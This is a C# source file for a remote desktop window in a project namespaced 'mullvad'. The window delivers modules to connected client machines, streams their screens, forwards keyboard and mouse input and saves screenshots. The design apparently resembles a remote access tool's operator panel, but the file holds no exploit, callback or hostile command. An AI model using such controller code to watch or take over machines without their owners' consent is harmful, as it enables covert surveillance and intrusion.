using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms
{
    internal sealed class RemoteDesktopForm : Form
    {
        // ── Module wiring ─────────────────────────────────────────────────────
        private const string ModuleFileJpeg = "mullvad.Module.RemoteDesktop";
        private const string ModuleIdJpeg   = "mullvad.remotedesktop";
        private const string ModuleFileH265 = "mullvad.Module.RemoteDesktopH265";
        private const string ModuleIdH265   = "mullvad.remotedesktoph265";

        private readonly ClientHandler _handler;
        private readonly bool          _h265Mode;
        private ModuleContext?         _ctx;

        // ── Stream state ──────────────────────────────────────────────────────
        private CancellationTokenSource _streamCts = new CancellationTokenSource();
        private volatile bool           _streaming;
        private int                     _remoteW, _remoteH;
        private int                     _monitorOffsetX, _monitorOffsetY;

        // _currentFrame is touched ONLY on the UI thread — no lock needed.
        private Image?                  _currentFrame;
        private Rectangle               _displayRect;

        private Task                    _decodeTask = Task.CompletedTask;

        private readonly List<string>   _inputQueue = new List<string>(32);
        private readonly object         _inputLock  = new object();

        // ── Stats ─────────────────────────────────────────────────────────────
        private int    _frameCount;
        private int    _fpsCount;
        private long   _lastFpsMs;
        private double _currentFps;

        // ── Singleton per client ──────────────────────────────────────────────
        private static readonly Dictionary<ClientHandler, RemoteDesktopForm> _openForms = new();

        public static RemoteDesktopForm CreateOrActivate(ClientHandler handler, bool h265 = false)
        {
            if (_openForms.TryGetValue(handler, out var existing) && !existing.IsDisposed)
            {
                existing.BringToFront();
                return existing;
            }
            var frm = new RemoteDesktopForm(handler, h265);
            frm.FormClosed += (_, _) => _openForms.Remove(handler);
            _openForms[handler] = frm;
            return frm;
        }

        private RemoteDesktopForm(ClientHandler handler, bool h265)
        {
            _handler  = handler;
            _h265Mode = h265;
            Build();
        }

        // ── UI controls ───────────────────────────────────────────────────────
        private Panel          _displayPanel   = null!;
        private Panel          _bottomPanel    = null!;
        private CheckBox       _chkKeyboard    = null!, _chkMouseClicks = null!, _chkMouseMove = null!;
        private CheckBox       _chkAutoStart   = null!, _chkShowCursor  = null!;
        private Button         _btnSaveFrame   = null!;
        private TrackBar       _trkQuality     = null!;
        private Label          _lblQualVal     = null!;
        private ComboBox       _cmbMonitor     = null!;
        private Button         _btnStart = null!, _btnStop = null!;
        private ToolStripStatusLabel _lblStatus = null!, _lblTimestamp = null!, _lblSize = null!, _lblRes = null!, _lblQuality = null!;
        private string         _saveFolder = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

        // ── Settings ──────────────────────────────────────────────────────────
        private int _targetFps => _h265Mode ? 60 : 30;
        private int _quality   => _trkQuality?.Value ?? (_h265Mode ? 55 : 70);
        private int _monitorIdx => _cmbMonitor?.SelectedIndex >= 0 ? _cmbMonitor.SelectedIndex : 0;

        // ── Build UI ──────────────────────────────────────────────────────────
        private void Build()
        {
            SuspendLayout();

            Text          = $"{(_h265Mode ? "Remote Desktop H265" : "Remote Desktop")}  —  {_handler.Info.Computer}";
            ClientSize    = new Size(860, 560);
            MinimumSize   = new Size(600, 480);
            Font          = new Font("Segoe UI", 9F);
            StartPosition = FormStartPosition.CenterParent;
            ShowInTaskbar = true;
            KeyPreview    = true;

            var iconBmp = IconLoader.Load("monitor.png") as Bitmap;
            if (iconBmp is not null) try { Icon = Icon.FromHandle(iconBmp.GetHicon()); } catch { }
            else Icon = SystemIcons.Application;

            var strip = new StatusStrip { SizingGrip = false };
            _lblStatus    = new ToolStripStatusLabel("Status: Ready")      { Spring = false, BorderSides = ToolStripStatusLabelBorderSides.Right };
            _lblTimestamp = new ToolStripStatusLabel("Frame: --")          { Spring = false, BorderSides = ToolStripStatusLabelBorderSides.Right };
            _lblSize      = new ToolStripStatusLabel("Size: --")           { Spring = false, BorderSides = ToolStripStatusLabelBorderSides.Right };
            _lblRes       = new ToolStripStatusLabel("Res: --")            { Spring = false, BorderSides = ToolStripStatusLabelBorderSides.Right };
            _lblQuality   = new ToolStripStatusLabel("FPS: --  |  Q: --") { Spring = true };
            strip.Items.AddRange(new ToolStripItem[] { _lblStatus, _lblTimestamp, _lblSize, _lblRes, _lblQuality });

            _bottomPanel = new Panel { Dock = DockStyle.Bottom, Height = 72, Padding = new Padding(4, 4, 4, 4) };

            var grpInput = new GroupBox { Text = "Remote Input", Left = 4, Top = 4, Width = 142, Height = 60, Font = new Font("Segoe UI", 8F) };
            _chkKeyboard    = new CheckBox { Text = "Keyboard",       Left = 8, Top = 14, Width = 120, AutoSize = true };
            _chkMouseClicks = new CheckBox { Text = "Mouse clicks",   Left = 8, Top = 30, Width = 120, AutoSize = true };
            _chkMouseMove   = new CheckBox { Text = "Mouse movement", Left = 8, Top = 46, Width = 120, AutoSize = true };
            grpInput.Controls.AddRange(new Control[] { _chkKeyboard, _chkMouseClicks, _chkMouseMove });

            var grpOpts = new GroupBox { Text = "Options", Left = 152, Top = 4, Width = 160, Height = 60, Font = new Font("Segoe UI", 8F) };
            _chkAutoStart  = new CheckBox { Text = "AutoStart",          Left = 8, Top = 14, Width = 148, AutoSize = true };
            _chkShowCursor = new CheckBox { Text = "Show remote cursor", Left = 8, Top = 30, Width = 148, AutoSize = true };
            grpOpts.Controls.AddRange(new Control[] { _chkAutoStart, _chkShowCursor });
            _chkShowCursor.CheckedChanged += (_, _) => _displayPanel.Invalidate();

            var grpOther = new GroupBox { Text = "Other", Left = 318, Top = 4, Width = 220, Height = 60, Font = new Font("Segoe UI", 8F) };
            _btnSaveFrame = new Button { Text = "Save Frame", Left = 8, Top = 14, Width = 78, Height = 22, FlatStyle = FlatStyle.Flat };
            var btnFolder = new Button { Left = 88, Top = 14, Width = 22, Height = 22, FlatStyle = FlatStyle.Flat, Text = "…" };
            var lblMon    = new Label  { Text = "Monitor:", Left = 116, Top = 17, AutoSize = true };
            _cmbMonitor   = new ComboBox { Left = 162, Top = 14, Width = 52, DropDownStyle = ComboBoxStyle.DropDownList, FlatStyle = FlatStyle.Flat };
            foreach (var s in Screen.AllScreens)
                _cmbMonitor.Items.Add(s.Primary ? "Primary" : s.DeviceName.Replace("\\\\.\\", ""));
            if (_cmbMonitor.Items.Count > 0) _cmbMonitor.SelectedIndex = 0;
            grpOther.Controls.AddRange(new Control[] { _btnSaveFrame, btnFolder, lblMon, _cmbMonitor });
            _btnSaveFrame.Click += BtnSaveFrame_Click;
            btnFolder.Click += (_, _) =>
            {
                using var dlg = new FolderBrowserDialog { SelectedPath = _saveFolder };
                if (dlg.ShowDialog(this) == DialogResult.OK)
                    _saveFolder = dlg.SelectedPath;
            };

            var lblQ = new Label { Text = "Quality:", Left = 544, Top = 20, AutoSize = true };
            _trkQuality = new TrackBar
            {
                Left = 598, Top = 10, Width = 120, Height = 30,
                Minimum = 10, Maximum = 100,
                Value   = _h265Mode ? 55 : 70,
                SmallChange = 5, LargeChange = 10, TickFrequency = 10,
                TickStyle = TickStyle.BottomRight,
            };
            _lblQualVal = new Label { Text = _trkQuality.Value.ToString(), Left = 722, Top = 20, Width = 24, AutoSize = false };
            _trkQuality.ValueChanged += (_, _) => _lblQualVal.Text = _trkQuality.Value.ToString();

            _btnStart = new Button { Text = "Start", Left = 752, Top = 16, Width = 52, Height = 26, FlatStyle = FlatStyle.Flat };
            _btnStop  = new Button { Text = "Stop",  Left = 808, Top = 16, Width = 52, Height = 26, FlatStyle = FlatStyle.Flat, Enabled = false };
            _btnStart.Click += BtnStart_Click;
            _btnStop.Click  += BtnStop_Click;

            _bottomPanel.Controls.AddRange(new Control[] {
                grpInput, grpOpts, grpOther,
                lblQ, _trkQuality, _lblQualVal,
                _btnStart, _btnStop
            });

            _displayPanel = new DoubleBufferedPanel
            {
                Dock      = DockStyle.Fill,
                BackColor = Color.Black,
            };
            _displayPanel.Paint      += DisplayPanel_Paint;
            _displayPanel.MouseMove  += DisplayPanel_MouseMove;
            _displayPanel.MouseDown  += DisplayPanel_MouseDown;
            _displayPanel.MouseUp    += DisplayPanel_MouseUp;
            _displayPanel.MouseWheel += DisplayPanel_MouseWheel;
            _displayPanel.MouseClick += (_, _) => _displayPanel.Focus();
            _displayPanel.Resize     += (_, _) => _displayPanel.Invalidate();

            KeyDown += Form_KeyDown;
            KeyUp   += Form_KeyUp;

            Controls.Add(_displayPanel);
            Controls.Add(_bottomPanel);
            Controls.Add(strip);

            Load       += OnLoad;
            FormClosed += OnFormClosed;

            ResumeLayout(false);
        }

        // ── Load — deliver module ─────────────────────────────────────────────
        private async void OnLoad(object? sender, EventArgs e)
        {
            _btnStart.Enabled = false;
            _lblStatus.Text   = "Status: Delivering module…";

            _handler.Disconnected += OnClientDisconnected;

            string moduleFile = _h265Mode ? ModuleFileH265 : ModuleFileJpeg;
            string moduleId   = _h265Mode ? ModuleIdH265   : ModuleIdJpeg;

            var bytes = ModuleLoader.GetModuleBytes(moduleFile);
            if (bytes == null)
            {
                _lblStatus.Text = "Status: Module file not found.";
                return;
            }

            var progress = new Progress<string>(msg => _lblStatus.Text = "Status: " + msg);

            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
            bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, moduleFile, bytes, progress, cts.Token);

            if (!ok)
            {
                _lblStatus.Text = "Status: Module delivery failed.";
                return;
            }

            _ctx = new ModuleContext(_handler, moduleId);
            _ctx.Disconnected += (_, _) => BeginInvoke(() => OnClientDisconnected(_handler));

            _btnStart.Enabled = true;
            _lblStatus.Text   = "Status: Ready";

            if (_chkAutoStart.Checked)
                _ = StartStreamAsync();
        }

        private void OnFormClosed(object? sender, FormClosedEventArgs e)
        {
            _handler.Disconnected -= OnClientDisconnected;
            StopStream();
            _streamCts.Dispose();
            _ctx?.Dispose();
            _currentFrame?.Dispose();
            _currentFrame = null;
        }

        private void OnClientDisconnected(ClientHandler _)
        {
            if (IsDisposed) return;
            BeginInvoke(() =>
            {
                StopStream();
                _btnStart.Enabled = false;
                _lblStatus.Text   = "Status: Disconnected.";
            });
        }

        // ── Start / Stop ──────────────────────────────────────────────────────
        private async void BtnStart_Click(object? sender, EventArgs e) => await StartStreamAsync();
        private void BtnStop_Click(object? sender, EventArgs e)         => StopStream();

        private async Task StartStreamAsync()
        {
            if (_streaming || _ctx == null) return;

            _streamCts?.Dispose();
            _streamCts = new CancellationTokenSource();
            _streaming = true;

            _btnStart.Enabled = false;
            _btnStop.Enabled  = true;
            _lblStatus.Text   = "Status: Starting…";

            try
            {
                int cursor = _chkShowCursor.Checked ? 1 : 0;
                var startPayload =
                    $"{{\"fps\":{_targetFps},\"quality\":{_quality},\"monitor\":{_monitorIdx},\"cursor\":{cursor}}}";
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10));
                var resp = await _ctx.ExecuteAsync("start_stream", startPayload, cts.Token);

                _remoteW = ParseInt(resp, "width",  1920);
                _remoteH = ParseInt(resp, "height", 1080);
                // Server tells us the monitor's virtual-desktop origin — trust that over local guesswork.
                _monitorOffsetX = ParseInt(resp, "x", 0);
                _monitorOffsetY = ParseInt(resp, "y", 0);
                _lblRes.Text = $"Res: {_remoteW}×{_remoteH}";
            }
            catch
            {
                _lblStatus.Text = "Status: Failed to start stream.";
                StopStream();
                return;
            }

            _fpsCount   = 0;
            _lastFpsMs  = Stopwatch.GetTimestamp();
            _currentFps = 0;
            _lblStatus.Text = "Status: Streaming…";

            _ = StreamLoopAsync(_streamCts.Token);
        }

        private void StopStream()
        {
            if (!_streaming) return;
            _streaming = false;
            _streamCts?.Cancel();

            if (_ctx != null)
            {
                _ = Task.Run(async () =>
                {
                    try
                    {
                        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(3));
                        await _ctx.ExecuteAsync("stop_stream", "", cts.Token);
                    }
                    catch { }
                });
            }

            if (!IsDisposed)
            {
                BeginInvoke(() =>
                {
                    _btnStart.Enabled = true;
                    _btnStop.Enabled  = false;
                    _lblStatus.Text   = "Status: Stopped.";
                    _displayPanel.Invalidate();
                });
            }
        }

        // ── Streaming loop ────────────────────────────────────────────────────
        // Overlaps network RTT with decode: while the next get_frame is in flight,
        // the previous frame's decode is running on the ThreadPool.
        private async Task StreamLoopAsync(CancellationToken ct)
        {
            while (!ct.IsCancellationRequested && _streaming && _ctx != null)
            {
                Task<string> jsonTask;
                try
                {
                    var cts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                    cts.CancelAfter(TimeSpan.FromSeconds(5));
                    jsonTask = _ctx.ExecuteAsync("get_frame", BuildGetFramePayload(), cts.Token);
                }
                catch { break; }

                string? json = null;
                try { json = await jsonTask.ConfigureAwait(false); }
                catch (OperationCanceledException) { break; }
                catch { break; }

                if (ct.IsCancellationRequested) break;

                // Cap in-flight decodes at one so a slow decoder can't outrun us.
                if (!_decodeTask.IsCompleted)
                {
                    try { await _decodeTask.ConfigureAwait(false); } catch { }
                }

                if (json == null || json.IndexOf("\"ok\":true", StringComparison.Ordinal) < 0)
                {
                    try { await Task.Delay(20, ct).ConfigureAwait(false); } catch { break; }
                    continue;
                }

                if (json.IndexOf("\"same\":true", StringComparison.Ordinal) >= 0)
                {
                    OnFrameKept();
                    UpdateFpsCounter();
                    continue;
                }

                var captured = json;
                _decodeTask = Task.Run(() => ProcessFrameJson(captured));
                UpdateFpsCounter();
            }

            if (!IsDisposed)
                BeginInvoke(() => { if (_streaming) StopStream(); });
        }

        private string BuildGetFramePayload()
        {
            List<string> events;
            lock (_inputLock)
            {
                events = new List<string>(_inputQueue);
                _inputQueue.Clear();
            }

            // Coalesce mouse-move events — only the latest position matters.
            int lastMm = -1;
            for (int i = 0; i < events.Count; i++)
                if (IsMouseMove(events[i])) lastMm = i;

            var sb = new StringBuilder(160 + events.Count * 32);
            sb.Append("{\"fps\":").Append(_targetFps)
              .Append(",\"quality\":").Append(_quality)
              .Append(",\"cursor\":").Append(_chkShowCursor.Checked ? "1" : "0")
              .Append(",\"input\":[");
            bool first = true;
            for (int i = 0; i < events.Count; i++)
            {
                if (IsMouseMove(events[i]) && i != lastMm) continue;
                if (!first) sb.Append(',');
                first = false;
                sb.Append(events[i]);
            }
            sb.Append("]}");
            return sb.ToString();
        }

        private static bool IsMouseMove(string ev) =>
            ev.Length >= 9 && ev[0] == '{' && ev[7] == 'm' && ev[8] == 'm';

        // ── Frame handling ────────────────────────────────────────────────────
        // Runs on ThreadPool. Decode off UI, then hand the swap to the UI thread
        // so paint never races a dispose.
        private void ProcessFrameJson(string json)
        {
            int idx = json.IndexOf("\"data\":\"", StringComparison.Ordinal);
            if (idx < 0) return;
            int start = idx + 8;
            int end   = json.IndexOf('"', start);
            if (end < 0) return;

            byte[] imgBytes;
            try { imgBytes = Convert.FromBase64String(json.Substring(start, end - start)); }
            catch { return; }

            Image newFrame;
            try
            {
                newFrame = _h265Mode
                    ? mullvad.Video.HevcCompression.Decode(imgBytes)
                    : Image.FromStream(new MemoryStream(imgBytes), false, false);
            }
            catch { return; }

            int frameSize = imgBytes.Length;

            if (IsDisposed) { newFrame.Dispose(); return; }
            try
            {
                BeginInvoke(() =>
                {
                    if (IsDisposed) { newFrame.Dispose(); return; }
                    var old = _currentFrame;
                    _currentFrame = newFrame;
                    old?.Dispose();
                    _displayPanel.Invalidate();
                    _lblTimestamp.Text = "Frame: " + DateTime.Now.ToString("HH:mm:ss.fff");
                    _lblSize.Text      = "Size: " + (frameSize / 1024.0).ToString("F1") + " KB";
                    _lblQuality.Text   = $"FPS: {_currentFps:F1}  |  Q: {_quality}";
                    _frameCount++;
                });
            }
            catch { newFrame.Dispose(); }
        }

        // Server returned same:true — no new bitmap, just tick the stats.
        private void OnFrameKept()
        {
            if (IsDisposed) return;
            try
            {
                BeginInvoke(() =>
                {
                    if (IsDisposed) return;
                    _lblTimestamp.Text = "Frame: " + DateTime.Now.ToString("HH:mm:ss.fff");
                    _lblQuality.Text   = $"FPS: {_currentFps:F1}  |  Q: {_quality}";
                });
            }
            catch { }
        }

        private void UpdateFpsCounter()
        {
            _fpsCount++;
            long now     = Stopwatch.GetTimestamp();
            long elapsed = now - _lastFpsMs;
            if (elapsed >= Stopwatch.Frequency)
            {
                _currentFps = _fpsCount * Stopwatch.Frequency / (double)elapsed;
                _fpsCount   = 0;
                _lastFpsMs  = now;
            }
        }

        // ── Paint ─────────────────────────────────────────────────────────────
        private void DisplayPanel_Paint(object? sender, PaintEventArgs e)
        {
            var frame = _currentFrame;
            var g     = e.Graphics;
            var cs    = _displayPanel.ClientSize;
            if (frame == null || cs.Width <= 0 || cs.Height <= 0)
            {
                _displayRect = Rectangle.Empty;
                return;
            }

            g.InterpolationMode  = InterpolationMode.Bilinear;
            g.PixelOffsetMode    = PixelOffsetMode.Half;
            g.CompositingQuality = CompositingQuality.HighSpeed;
            g.SmoothingMode      = SmoothingMode.HighSpeed;

            var dst = new Rectangle(0, 0, cs.Width, cs.Height);
            g.DrawImage(frame, dst);
            _displayRect = dst;
        }

        // ── Input forwarding ──────────────────────────────────────────────────
        private void DisplayPanel_MouseMove(object? sender, MouseEventArgs e)
        {
            if (!_chkMouseMove.Checked || !_streaming) return;
            var (rx, ry) = MapToRemote(e.X, e.Y);
            if (rx < 0) return;
            QueueInput($"{{\"t\":\"mm\",\"x\":{rx},\"y\":{ry}}}");
        }

        private void DisplayPanel_MouseDown(object? sender, MouseEventArgs e)
        {
            if (!_chkMouseClicks.Checked || !_streaming) return;
            var (rx, ry) = MapToRemote(e.X, e.Y);
            if (rx < 0) return;
            if (_chkMouseMove.Checked)
                QueueInput($"{{\"t\":\"mm\",\"x\":{rx},\"y\":{ry}}}");
            string btn = e.Button == MouseButtons.Right ? "mr" : e.Button == MouseButtons.Middle ? "mb" : "ml";
            QueueInput($"{{\"t\":\"{btn}\",\"d\":1}}");
        }

        private void DisplayPanel_MouseUp(object? sender, MouseEventArgs e)
        {
            if (!_chkMouseClicks.Checked || !_streaming) return;
            string btn = e.Button == MouseButtons.Right ? "mr" : e.Button == MouseButtons.Middle ? "mb" : "ml";
            QueueInput($"{{\"t\":\"{btn}\",\"d\":0}}");
        }

        private void DisplayPanel_MouseWheel(object? sender, MouseEventArgs e)
        {
            if (!_chkMouseClicks.Checked || !_streaming) return;
            QueueInput($"{{\"t\":\"mw\",\"delta\":{e.Delta}}}");
        }

        private void Form_KeyDown(object? sender, KeyEventArgs e)
        {
            if (!_chkKeyboard.Checked || !_streaming || !_displayPanel.Focused) return;
            int vk = (int)e.KeyCode;
            QueueInput($"{{\"t\":\"kd\",\"vk\":{vk}}}");
            e.Handled = true;
            e.SuppressKeyPress = true;
        }

        private void Form_KeyUp(object? sender, KeyEventArgs e)
        {
            if (!_chkKeyboard.Checked || !_streaming || !_displayPanel.Focused) return;
            int vk = (int)e.KeyCode;
            QueueInput($"{{\"t\":\"ku\",\"vk\":{vk}}}");
        }

        private void QueueInput(string json)
        {
            lock (_inputLock)
            {
                if (_inputQueue.Count < 128)
                    _inputQueue.Add(json);
            }
        }

        private (int rx, int ry) MapToRemote(int px, int py)
        {
            if (_remoteW <= 0 || _remoteH <= 0) return (-1, -1);
            var r = _displayRect;
            if (r.Width <= 0 || r.Height <= 0) return (-1, -1);
            int lx = px - r.X;
            int ly = py - r.Y;
            if (lx < 0 || ly < 0 || lx >= r.Width || ly >= r.Height) return (-1, -1);
            int rx = (int)((float)lx / r.Width  * _remoteW) + _monitorOffsetX;
            int ry = (int)((float)ly / r.Height * _remoteH) + _monitorOffsetY;
            return (rx, ry);
        }

        // ── Save frame ────────────────────────────────────────────────────────
        private void BtnSaveFrame_Click(object? sender, EventArgs e)
        {
            var src = _currentFrame;
            if (src == null)
            {
                MessageBox.Show("No frame to save.", "Save Frame", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            Image copy;
            try { copy = (Image)src.Clone(); }
            catch { return; }

            try
            {
                Directory.CreateDirectory(_saveFolder);
                var path = Path.Combine(_saveFolder,
                    $"screenshot_{_handler.Info.Computer}_{DateTime.Now:yyyyMMdd_HHmmss}.jpg");
                copy.Save(path, ImageFormat.Jpeg);
                _lblStatus.Text = "Status: Saved → " + Path.GetFileName(path);
            }
            catch (Exception ex) { MessageBox.Show(ex.Message, "Save Frame", MessageBoxButtons.OK, MessageBoxIcon.Error); }
            finally { copy.Dispose(); }
        }

        // ── Helpers ───────────────────────────────────────────────────────────
        private static int ParseInt(string? json, string key, int def)
        {
            if (string.IsNullOrEmpty(json)) return def;
            var k    = "\"" + key + "\"";
            int idx  = json.IndexOf(k);
            if (idx < 0) return def;
            int c = json.IndexOf(':', idx + k.Length);
            if (c < 0) return def;
            int s = c + 1;
            while (s < json.Length && json[s] == ' ') s++;
            bool neg = s < json.Length && json[s] == '-';
            if (neg) s++;
            int end = s;
            while (end < json.Length && char.IsDigit(json[end])) end++;
            if (end == s) return def;
            return int.TryParse(json.Substring(s, end - s), out int v) ? (neg ? -v : v) : def;
        }

        // ── Double-buffered panel ─────────────────────────────────────────────
        private sealed class DoubleBufferedPanel : Panel
        {
            public DoubleBufferedPanel()
            {
                SetStyle(ControlStyles.AllPaintingInWmPaint |
                         ControlStyles.UserPaint |
                         ControlStyles.DoubleBuffer, true);
            }
        }
    }
}
